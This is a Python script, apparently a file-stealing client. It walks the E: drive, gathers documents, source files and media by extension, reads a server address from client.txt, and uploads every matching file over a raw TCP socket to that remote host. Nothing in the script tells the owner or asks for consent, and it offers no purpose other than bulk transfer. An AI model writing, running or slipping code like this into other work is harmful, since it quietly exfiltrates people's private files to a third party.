import string,os,time,sys
from socket import *
drive_list = []
file_path = []
for c in string.ascii_uppercase:
    drive = c + ':'
    if os.path.isdir(drive):
        drive_list.append(drive)
   
for v in ['E:']:

    for root, dirs, files in os.walk(v):
     
        for f in files:
         
            if os.path.splitext(f)[1] == '.mp3' or os.path.splitext(f)[1] == '.md' or  os.path.splitext(f)[1] == '.py' or os.path.splitext(f)[1] == '.txt' or os.path.splitext(f)[1] == '.avi' or os.path.splitext(f)[1] == '.mp4' or os.path.splitext(f)[1] == '.rmvb' or os.path.splitext(f)[1] == '.docx':
                abk = os.path.join(root,f)
                try:
                    f = open(abk,'rb')
                    f.close()
                    file_path.append(abk)

                except FileNotFoundError:
                    pass

print(file_path[0])               
os.chdir(sys.path[0])
with open('client.txt','rb') as f:
    data = f.read()
data = data.decode('gbk')
data = data.split()
try:
    adc = (data[1],int(data[3]))
except ValueError:
    print('配置文件出错........')
    sys.exit(1)
sock = socket(AF_INET,SOCK_STREAM)
sock.connect(adc)
sock.send(str(len(file_path)).encode())
time.sleep(1)
a = sock.recv(1024)
if a == 'ok'.encode():

    for i in file_path:
        filename = os.path.basename(i)
        
        
        sock.send(filename.encode())
        time.sleep(1)
            
        a  = sock.recv(1024)
        if a == 'ok'.encode():
            print(i)
            f = open(i,'rb')
            while True:
                data = f.read(2048)
                if not data:
                    
                    
                    break
                sock.send(data)
            time.sleep(1)
            sock.send('ok'.encode())
            f.close()
        